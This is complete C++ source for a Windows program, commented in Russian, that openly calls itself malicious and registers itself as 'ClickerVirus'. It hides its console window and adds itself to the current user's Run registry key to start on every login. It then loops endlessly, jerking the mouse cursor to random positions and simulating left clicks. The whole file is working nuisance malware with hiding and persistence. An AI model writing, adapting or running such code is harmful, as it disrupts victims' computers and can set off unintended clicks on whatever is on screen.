#include <iostream>
#include <Windows.h>
#include <string>
#include <random>
#include <chrono>

// Добавление в автозагрузку
void AddToStartup();

// Основная вредоносная активность
void MaliciousActivity();

// Генерация случайного числа
int getRandomNumber(int min, int max);

int main()
{
	// Подключение Русского языка для консоли
	SetConsoleCP(CP_UTF8);
	SetConsoleOutputCP(CP_UTF8);

	// Скрываем консоль с программой
	ShowWindow(GetConsoleWindow(), SW_HIDE);

	// Добавляем в автозагрузку
	AddToStartup();

	// Запускаем основную активность
	MaliciousActivity();


	return EXIT_SUCCESS;
}

void AddToStartup()
{
	// Создание ключа реестра
	HKEY hKey;

	// Массив для хранения пути к программе
	char exePath[MAX_PATH];
	// Узнаём где лежит программа
	GetModuleFileNameA(NULL, exePath, MAX_PATH);

	// Открываем реестр для записи
	LONG result = RegOpenKeyExA(
		HKEY_CURRENT_USER,
		"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
		0,
		KEY_SET_VALUE,
		&hKey
	);

	// Проверка результата
	if (result == ERROR_SUCCESS)
	{
		// Записываем значение в реестр
		RegSetValueExA(
			hKey,
			"ClickerVirus",
			0,
			REG_SZ,
			(BYTE*)exePath,
			strlen(exePath) + 1
		);

		// Закрытие ключа
		RegCloseKey(hKey);
	}
}

void MaliciousActivity()
{
	// Бесконечный цикл
	// Программа будет работать пока её не убьют
	while (true)
	{
		// Получаем позицию курсора
		POINT cursorPos;
		GetCursorPos(&cursorPos);

		// Двигаем курсор на случайную позицию
		if (getRandomNumber(1, 2) == 1)
		{
			SetCursorPos(cursorPos.x + getRandomNumber(2, 100),
				cursorPos.y + getRandomNumber(5, 100));
		}
		else
		{
			SetCursorPos(cursorPos.x - getRandomNumber(2, 100),
				cursorPos.y - getRandomNumber(5, 100));
		}

		// Небольшая пауза
		Sleep(100);

		// Имитируем клик
		mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
		mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);

		// Небольшая пауза
		Sleep(100);

		// Возвращаем курсор обратно
		SetCursorPos(cursorPos.x, cursorPos.y);

		// Программа засыпает на случайное время
		Sleep(getRandomNumber(250, 1500));
	}
}

int getRandomNumber(int min, int max)
{
	// Инициализация генератора случайных чисел
	static std::mt19937 generator(std::chrono::steady_clock::now().time_since_epoch().count());

	// Создание распределения в заданном диапазоне
	std::uniform_int_distribution<int> distribution(min, max);

	// Генерация и возврат случайного числа
	return distribution(generator);
}